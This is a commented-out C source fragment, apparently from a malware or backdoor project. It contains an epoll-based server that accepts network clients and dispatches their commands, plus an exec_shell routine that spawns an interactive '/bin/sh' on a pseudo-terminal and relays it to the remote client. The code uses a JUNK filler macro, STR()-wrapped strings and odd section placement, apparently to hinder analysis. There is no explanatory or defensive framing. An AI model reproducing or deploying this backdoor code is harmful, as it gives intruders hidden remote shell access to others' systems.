
//
//static void epoller(int sfd, char **envp)
//{
//	int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
//
//	char buf[256]; JUNK;
//
//	bool master_fd_set = false;
//
//	if (epoll_fd == -1) {
//		logger(STR("epoll_create1 failed\n"));
//		return;
//	} JUNK;
//
//	struct epoll_event ev;
//
//	ev.events = EPOLLIN;
//	ev.data.fd = sfd;
//
//	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sfd, &ev) == -1) {
//		logger(STR("epoll_ctl failed\n"));
//		close(epoll_fd);
//		return;
//	} JUNK;
//
//	kernel_sigset_t mask, oldmask;
//
//
//	ft_sigemptyset(&mask);
//	ft_sigaddset(&mask, SIGCHLD);
//	sigprocmask(SIG_BLOCK, &mask, &oldmask, _NSIG/8);
//
//	int signal_fd = signalfd4(-1, &mask, _NSIG/8, SFD_NONBLOCK | SFD_CLOEXEC);
//
//	if (signal_fd == -1) {
//		logger(STR("signalfd failed\n"));
//		close(epoll_fd);
//		return;
//	} JUNK;
//
//	ev.events = EPOLLIN;
//	ev.data.fd = signal_fd;
//
//	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, signal_fd, &ev) == -1) {
//		logger(STR("epoll_ctl failed\n"));
//		close(epoll_fd);
//		return;
//	} JUNK;
//
//	struct epoll_event events[MAX_CLIENTS];
//
//	size_t max_events = MAX_CLIENTS + 2;
//	size_t nb_users = 0;
//
//	while (1) {
//		int n = epoll_wait(epoll_fd, events, max_events, -1);
//		if (n == -1) {
//			logger(STR("epoll_wait failed\n"));
//			break;
//		} JUNK;
//
//		for (int i = 0; i < n; i++) {
//			if (events[i].data.fd == sfd) {
//				int client_fd = accept_client(sfd);
//				if (client_fd == -1) {
//					logger(STR("accept failed\n"));
//					break;
//				}
//
//				if (nb_users >= MAX_CLIENTS) {
//					logger(STR("max clients reached\n"));
//					close(client_fd);
//					continue;
//				} JUNK;
//
//				ev.events = EPOLLIN;
//				ev.data.fd = client_fd;
//				if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, client_fd, &ev) == -1) {
//					logger(STR("epoll_ctl failed\n"));
//					close(client_fd);
//					break;
//				} JUNK;
//
//				nb_users++;
//
//			} else if (events[i].data.fd == signal_fd) {
//
//				struct signalfd_siginfo siginfo;
//				ssize_t s = read(signal_fd, &siginfo, sizeof(siginfo));
//				if (s != sizeof(siginfo)) {
//					logger(STR("read failed\n"));
//					break;
//				} JUNK;
//
//				if (siginfo.ssi_signo == SIGCHLD) {
//					siginfo_t info;
//					pid_t pid = waitid(P_ALL, 0, &info, WEXITED | WNOHANG);
//					if (pid == 0) {
//						if (info.si_code == CLD_EXITED) {
//							logger(STR("child process terminated\n"));
//						} else if (info.si_code == CLD_KILLED) {
//							logger(STR("child process killed\n"));
//						} else if (info.si_code == CLD_DUMPED) {
//							logger(STR("child process dumped\n"));
//						} else if (info.si_code == CLD_STOPPED) {
//							logger(STR("child process stopped\n"));
//						} else if (info.si_code == CLD_CONTINUED) {
//							logger(STR("child process continued\n"));
//						}
//					}
//				}
//			} else if (events[i].data.fd == g_master_fd) {
//				if (events[i].events & EPOLLIN) {
//					buf[0] = '\0';
//					ssize_t ret = read(g_master_fd, buf, sizeof(buf) - 1);
//					buf[ret] = '\0';
//					write(g_client_fd, buf, ret);
//				} else if (events[i].events & EPOLLRDHUP || events[i].events & EPOLLHUP) {
//					logger(STR("master fd closed\n"));
//					epoll_ctl(epoll_fd, EPOLL_CTL_DEL, g_master_fd, NULL);
//					close(g_master_fd);
//					g_master_fd = -1;
//					master_fd_set = false;
//				} else {
//					logger(STR("unknown event on master fd\n"));
//				}
//					
//			} else {
//
//
//				buf[0] = '\0';
//
//				//check if fd is blocking
//				int flags = fcntl(events[i].data.fd, F_GETFL, 0);
//				if (flags == -1) {
//					logger(STR("fcntl failed\n"));
//					break;
//				}
//				if (flags & O_NONBLOCK) {
//					logger(STR("fd is non-blocking\n"));
//				} else {
//					logger(STR("fd is blocking\n"));
//					continue;
//				}
//
//				ssize_t ret = read(events[i].data.fd, buf, sizeof(buf));
//
//				if (master_fd_set == true) {
//					write(g_master_fd, buf, ret);
//					continue;
//				}
//
//				
//				if (ret == -1) {
//					logger(STR("read failed\n"));
//					if (g_errno == EAGAIN || g_errno == EWOULDBLOCK) {
//						continue;
//					}
//					//epoll_ctl(epoll_fd, EPOLL_CTL_DEL, events[i].data.fd, NULL);
//					//close(events[i].data.fd);
//					break;
//				} else if (ret == 0) {
//					logger(STR("client disconnected\n"));
//					epoll_ctl(epoll_fd, EPOLL_CTL_DEL, events[i].data.fd, NULL);
//					close(events[i].data.fd);
//					nb_users--;
//					continue;
//				} JUNK;
//
//				if (buf[ret - 1] == '\n') {
//					buf[ret - 1] = '\0';
//				}
//
//				param_t command = {
//					.client_fd = events[i].data.fd,
//					.envp = envp,
//			};
//				int (*func)(param_t *) = get_command(buf);
//				if (func != NULL) {
//					func(&command);
//				}
//
//				if (g_master_fd != -1 && master_fd_set == false) {
//					master_fd_set = true;
//					ev.events = EPOLLIN;
//					ev.data.fd = g_master_fd;
//					if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, g_master_fd, &ev) == -1) {
//						logger(STR("epoll_ctl failed\n"));
//						close(g_master_fd);
//						g_master_fd = -1;
//					} else {
//						logger(STR("master fd set\n"));
//					}
//				}
//			}
//		}
//	}
//}
//


//int __attribute__((section(".text#"))) g_master_fd = -1;
//int __attribute__((section(".text#"))) g_client_fd = -1;

//int exec_shell(param_t *command)
//{
//	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
//	//int client_fd = command->client_fd;
//	int master_fd = -1;
//	int slave_fd = -1;
//	int unlock = 0;
//
//	/* O_NOCTTY: don't assign controlling terminal */
//	master_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
//	if (master_fd == -1) {
//		logger(STR("open failed\n"));
//		return -1;
//	} JUNK;
//
//	/* unlock the pty */
//	ioctl(master_fd, TIOCSPTLCK, &unlock);
//
//
//	int pty_num;
//	if (ioctl(master_fd, TIOCGPTN, &pty_num) == -1) {
//		logger(STR("ioctl failed\n"));
//		close(master_fd);
//		return -1;
//	} JUNK;
//
//	char pty_name[32];
//	char *ptr = pty_name;
//	ptr = ft_stpncpy(ptr, STR("/dev/pts/"), 32 - (ptr - pty_name));
//	itoa(pty_num, ptr);
//
//	logger(pty_name);
//
//	for (unsigned int i = 0; i < sizeof(pty_name); i++) {
//		if (pty_name[i] == '\0') {
//			logger(STR("found null\n"));
//			char len[32];
//			itoa(i, len);
//			logger(len);
//			break;
//		}
//	}
//
//	pid_t pid = fork();
//	if (pid == -1) {
//		logger(STR("fork failed\n"));
//		close(master_fd);
//		return -1;
//	} JUNK;
//
//	if (pid == 0) {
//
//		slave_fd = open(pty_name, O_RDWR, 0);
//		if (slave_fd == -1) {
//			logger(STR("open slave failed\n"));
//			exit(1);
//		} JUNK;
//
//		if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
//			logger(STR("prctl failed\n"));
//			exit(1);
//		}
//
//		if (setsid() == -1) {
//			logger(STR("setsid failed\n"));
//			exit(1);
//		} JUNK;
//
//
//		/* TIOCSCTTY: set the controlling terminal */
//		if (ioctl(slave_fd, TIOCSCTTY, NULL) == -1) {
//			logger(STR("ioctl failed\n"));
//			exit(1);
//		} JUNK;
//
//		dup2(slave_fd, 0);
//		dup2(slave_fd, 1);
//		dup2(slave_fd, 2);
//		execve(argv[0], argv, command->envp);
//		exit(1);
//	} 
//	else {
//
//		/* relay data between master_fd and client_fd */
//		if (setblocking(master_fd) < 0) {
//			logger(STR("setblocking failed\n"));
//			close(master_fd);
//			return -1;
//		} JUNK;
//
//		g_master_fd = master_fd;
//		g_client_fd = command->client_fd;
//		
//	}
//	return 0;
//}

